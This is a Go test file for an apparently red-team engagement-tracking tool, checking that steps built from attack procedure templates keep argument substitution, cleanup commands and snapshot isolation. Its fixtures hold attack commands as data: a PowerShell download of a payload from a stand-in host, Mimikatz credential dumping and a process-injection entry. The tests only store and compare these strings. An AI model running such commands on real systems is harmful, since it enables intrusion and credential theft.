package engagement_test

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/bryanster/blacklight/internal/authn"
	"github.com/bryanster/blacklight/internal/engagement"
	storecontent "github.com/bryanster/blacklight/internal/store/content"
	storengagement "github.com/bryanster/blacklight/internal/store/engagement"
	"github.com/bryanster/blacklight/internal/store/identity"
	"github.com/bryanster/blacklight/internal/store/storetest"
)

// fromTemplateDeps holds everything needed for a from-template test.
type fromTemplateDeps struct {
	Procedures  *storecontent.Procedures
	Engagements *storengagement.Engagements
	Service     *engagement.Service
	Engagement  storengagement.Engagement
	Scenario    storengagement.Scenario
}

func newFromTemplateDeps(t *testing.T) *fromTemplateDeps {
	t.Helper()

	db := storetest.Migrated(t)
	procedures := storecontent.NewProcedures(db)
	engagements := storengagement.NewEngagements(db)
	scenarios := storengagement.NewScenarios(db)
	steps := storengagement.NewSteps(db)
	memberships := identity.NewMemberships(db)

	svc, err := engagement.New(engagement.Deps{
		Engagements: engagements,
		AttackPin:   nil, // no technique resolution in these tests
		Memberships: memberships,
		Scenarios:   scenarios,
		Steps:       steps,
	})
	if err != nil {
		t.Fatalf("engagement.New: %v", err)
	}

	eng, err := engagements.Create(context.Background(), storengagement.NewEngagement{
		Name:          "From Template Test",
		AttackVersion: "15.1",
		Mode:          storengagement.EngagementModeStandard,
		CreatedBy:     "0192f1a0-0000-7000-8000-000000000000",
	})
	if err != nil {
		t.Fatalf("create engagement: %v", err)
	}

	scenario, err := scenarios.Create(context.Background(), storengagement.NewScenario{
		EngagementID: eng.ID,
		Name:         "Test Scenario",
		Source:       storengagement.ScenarioSourceManual,
	})
	if err != nil {
		t.Fatalf("create scenario: %v", err)
	}

	return &fromTemplateDeps{
		Procedures:  procedures,
		Engagements: engagements,
		Service:     svc,
		Engagement:  eng,
		Scenario:    scenario,
	}
}

func actorForTest() authn.Subject {
	return authn.Subject{
		UserID:      "0192f1a0-0000-7000-8000-000000000000",
		Email:       "test@example.com",
		DisplayName: "Test",
	}
}

func TestCreateStepFromTemplate_RoundTrip(t *testing.T) {
	t.Parallel()

	d := newFromTemplateDeps(t)
	ctx := context.Background()

	// Create a fixture procedure template with distinct command and cleanup.
	tmpl, err := d.Procedures.Create(ctx, storecontent.ProcedureTemplate{
		SourceID:          storecontent.SourceIDAtomic,
		Version:           storecontent.VersionCurrent,
		ExternalID:        "T1059.001-1",
		Name:              "PowerShell Download",
		Description:       "Downloads and executes a remote payload.",
		Platforms:         json.RawMessage(`["windows"]`),
		Executor:          "powershell",
		ElevationRequired: true,
		Command:           "Invoke-WebRequest -Uri #{url} -OutFile #{path}",
		Cleanup:           "Remove-Item #{path}",
		InputArgs:         json.RawMessage(`[{"name":"url","description":"Payload URL","type":"url","default":""},{"name":"path","description":"Output path","type":"path","default":"C:\\temp\\payload.exe"}]`),
		Dependencies:      `[{"name":"prereq","description":"Need admin"}]`,
	})
	if err != nil {
		t.Fatalf("create template: %v", err)
	}

	// Create a step from the template with arg substitution.
	step, err := d.Service.CreateStepFromTemplate(ctx, actorForTest(), engagement.CreateStepFromTemplateInput{
		EngagementID: d.Engagement.ID,
		ScenarioID:   d.Scenario.ID,
		Template:     tmpl,
		ArgValues: map[string]string{
			"url":  "https://example.com/payload.exe",
			"path": "C:\\temp\\payload.exe",
		},
	})
	if err != nil {
		t.Fatalf("CreateStepFromTemplate: %v", err)
	}

	// Verify step identity fields.
	if step.Name != tmpl.Name {
		t.Errorf("name = %q, want %q", step.Name, tmpl.Name)
	}
	if step.Objective != tmpl.Description {
		t.Errorf("objective = %q, want %q", step.Objective, tmpl.Description)
	}
	if step.TemplateID != tmpl.ID {
		t.Errorf("templateId = %q, want %q", step.TemplateID, tmpl.ID)
	}

	// Parse the procedure snapshot.
	var proc map[string]any
	if err := json.Unmarshal(step.Procedure, &proc); err != nil {
		t.Fatalf("unmarshal procedure: %v", err)
	}

	// Command and cleanup must be distinct and have arg substitution applied.
	if proc["command"] != "Invoke-WebRequest -Uri https://example.com/payload.exe -OutFile C:\\temp\\payload.exe" {
		t.Errorf("command = %q, want substituted", proc["command"])
	}
	if proc["cleanup"] != "Remove-Item C:\\temp\\payload.exe" {
		t.Errorf("cleanup = %q, want substituted", proc["cleanup"])
	}

	// Structure preserved: platforms, executor, elevation_required.
	if proc["executor"] != "powershell" {
		t.Errorf("executor = %q, want powershell", proc["executor"])
	}
	if proc["elevationRequired"] != true {
		t.Errorf("elevationRequired = %v, want true", proc["elevationRequired"])
	}

	// Dependency metadata preserved.
	if _, ok := proc["dependencies"]; !ok {
		t.Error("dependencies missing from procedure")
	}

	// Arg values included in snapshot.
	argVals, ok := proc["argValues"].(map[string]any)
	if !ok {
		t.Fatal("argValues missing from procedure")
	}
	if argVals["url"] != "https://example.com/payload.exe" {
		t.Errorf("argValues.url = %v", argVals["url"])
	}

	// Input args preserved.
	if _, ok := proc["inputArgs"]; !ok {
		t.Error("inputArgs missing from procedure")
	}

	// Technique external IDs omitted since no attackpin in tests.
	if _, ok := proc["techniqueExternalIds"]; ok {
		t.Error("techniqueExternalIds should not be present when template has none")
	}

	// Tools derived from platforms.
	var tools []string
	if err := json.Unmarshal(step.Tools, &tools); err != nil {
		t.Fatalf("unmarshal tools: %v", err)
	}
	if len(tools) != 1 || tools[0] != "windows" {
		t.Errorf("tools = %v, want [windows]", tools)
	}

	// Attack version snapshotted from engagement.
	if step.AttackVersion != d.Engagement.AttackVersion {
		t.Errorf("attackVersion = %q, want %q", step.AttackVersion, d.Engagement.AttackVersion)
	}
}

func TestCreateStepFromTemplate_SnapshotIsolation(t *testing.T) {
	t.Parallel()

	d := newFromTemplateDeps(t)
	ctx := context.Background()

	tmpl, err := d.Procedures.Create(ctx, storecontent.ProcedureTemplate{
		SourceID:   storecontent.SourceIDAtomic,
		Version:    storecontent.VersionCurrent,
		ExternalID: "T1003-2",
		Name:       "Credential Dump",
		Command:    "Invoke-Mimikatz",
		Cleanup:    "",
		Platforms:  json.RawMessage(`["windows"]`),
	})
	if err != nil {
		t.Fatalf("create template: %v", err)
	}

	// Create the step snapshot.
	step, err := d.Service.CreateStepFromTemplate(ctx, actorForTest(), engagement.CreateStepFromTemplateInput{
		EngagementID: d.Engagement.ID,
		ScenarioID:   d.Scenario.ID,
		Template:     tmpl,
	})
	if err != nil {
		t.Fatalf("CreateStepFromTemplate: %v", err)
	}

	originalName := step.Name
	originalProc := string(step.Procedure)

	// Now update the template in the content store.
	tmpl.Name = "Credential Dump (updated)"
	tmpl.Command = "Invoke-Mimikatz -DumpCreds"
	tmpl.Cleanup = "Remove-Item dump.bin"
	tmpl.Description = "Updated description"
	_, err = d.Procedures.Update(ctx, tmpl)
	if err != nil {
		t.Fatalf("update template: %v", err)
	}

	// Create a second step from the (now updated) template. It should get the new values.
	step2, err := d.Service.CreateStepFromTemplate(ctx, actorForTest(), engagement.CreateStepFromTemplateInput{
		EngagementID: d.Engagement.ID,
		ScenarioID:   d.Scenario.ID,
		Template:     tmpl,
	})
	if err != nil {
		t.Fatalf("CreateStepFromTemplate (second): %v", err)
	}

	// First step is unchanged (snapshot isolation).
	if step.Name != originalName {
		t.Errorf("first step name changed after template update: got %q, want %q", step.Name, originalName)
	}
	if string(step.Procedure) != originalProc {
		t.Errorf("first step procedure changed after template update")
	}

	// Second step reflects the updated template.
	if step2.Name != "Credential Dump (updated)" {
		t.Errorf("second step name = %q, want updated name", step2.Name)
	}

	var proc2 map[string]any
	if err := json.Unmarshal(step2.Procedure, &proc2); err != nil {
		t.Fatalf("unmarshal second procedure: %v", err)
	}
	if proc2["cleanup"] != "Remove-Item dump.bin" {
		t.Errorf("second step cleanup = %q, want updated cleanup", proc2["cleanup"])
	}

	// Verify the template itself was updated (not a no-op update).
	reloaded, err := d.Procedures.ByID(ctx, tmpl.ID)
	if err != nil {
		t.Fatalf("reload template: %v", err)
	}
	if reloaded.Name != "Credential Dump (updated)" {
		t.Errorf("template name not updated: got %q", reloaded.Name)
	}
}

func TestCreateStepFromTemplate_NameAndObjectiveOverride(t *testing.T) {
	t.Parallel()

	d := newFromTemplateDeps(t)
	ctx := context.Background()

	tmpl, err := d.Procedures.Create(ctx, storecontent.ProcedureTemplate{
		SourceID:    storecontent.SourceIDAtomic,
		Version:     storecontent.VersionCurrent,
		ExternalID:  "T1055-1",
		Name:        "Process Injection",
		Description: "Injects code into a running process.",
		Command:     "Invoke-Injection",
		Platforms:   json.RawMessage(`["windows"]`),
	})
	if err != nil {
		t.Fatalf("create template: %v", err)
	}

	step, err := d.Service.CreateStepFromTemplate(ctx, actorForTest(), engagement.CreateStepFromTemplateInput{
		EngagementID: d.Engagement.ID,
		ScenarioID:   d.Scenario.ID,
		Template:     tmpl,
		Name:         "Custom Step Name",
		Objective:    "Custom objective text",
		TargetAsset:  "DC01",
	})
	if err != nil {
		t.Fatalf("CreateStepFromTemplate: %v", err)
	}

	if step.Name != "Custom Step Name" {
		t.Errorf("name = %q, want Custom Step Name", step.Name)
	}
	if step.Objective != "Custom objective text" {
		t.Errorf("objective = %q, want Custom objective text", step.Objective)
	}
	if step.TargetAsset != "DC01" {
		t.Errorf("targetAsset = %q, want DC01", step.TargetAsset)
	}
}
